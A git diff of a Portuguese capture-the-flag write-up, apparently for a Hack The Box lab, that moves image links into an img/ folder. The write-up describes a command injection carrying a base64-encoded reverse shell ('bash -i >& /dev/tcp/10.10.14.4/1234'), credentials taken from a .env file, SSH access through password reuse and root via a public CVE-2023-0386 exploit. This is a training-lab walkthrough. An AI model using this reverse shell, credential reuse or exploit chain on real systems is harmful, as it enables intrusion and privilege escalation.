@@ -53,16 +53,16 @@ function makeInviteCode() {
 ```
 Percebo que existe esse endpoint "/api/v1/invite/how/to/generate" para o qual se eu fizer um POST consigo essa resposta:
 
-![invite/verify](IMG3.png)
+![invite/verify](img/IMG3.png)
 
 que contem uma mensagem em rot13, pedindo pra eu fazer outro POST para o endpoint "/api/v1/invite/generate", que contem, finalmente o codigo convite.
 
-![invite/generate](IMG4.png)
+![invite/generate](img/IMG4.png)
 
 Traduzindo de base64 para ascii, obtenho esse código: <mark>OXS2L-UXIYF-IEDKK-L9SXU</mark>
 Usando-o, consigo criar uma conta para o Pen-testing labs.
 
-![ptl](IMG5.png)
+![ptl](img/IMG5.png)
 
 Dentro desse site, existe uma aba "Access" que possui um tutorial para acessar o Pen-testing labs com o openvpn e tambem um botao para baixar o file do vpn,
 que faz uma requisição para /api/v1/user/vpn/generate.
@@ -132,7 +132,7 @@ base64 -d | bash;"}'
 
 O que está em base64 é o payload "bash -i >& /dev/tcp/10.10.14.4/1234 0>&1 
 
-![lsiterner](IMG6.png)
+![lsiterner](img/IMG6.png)
 
 Enumerando o diretório web, encontro um arquivo .env com credenciais de banco de dados:
 
@@ -143,14 +143,14 @@ DB_PASSWORD=SuperDuperPass123
 
 Verificando /etc/passwd, existe admin no sistema. Por reuso de senha, consigo logar via SSH com essas mesmas credenciais e pego a flag de usuário em /home/admin
 
-![flag1](IMG7.png)
+![flag1](img/IMG7.png)
 
 Dentro de /var/mail/admin, há um e-mail interno mencionando que o kernel está desatualizado e vulnerável a uma falha relacionada a OverlayFS/FUSE. Pesquisando, identifico que se trata da CVE-2023-0386.
 
 Baixo um exploit público para a CVE-2023-0386 (https://github.com/xkaneiki/CVE-2023-0386), transfiro para a máquina via scp, compilo com make all e executo.
 
-![exploit](IMG8.png)
+![exploit](img/IMG8.png)
 
 com isso consigo a flag de root
 
-![flag2](IMG9.png)
+![flag2](img/IMG9.png)
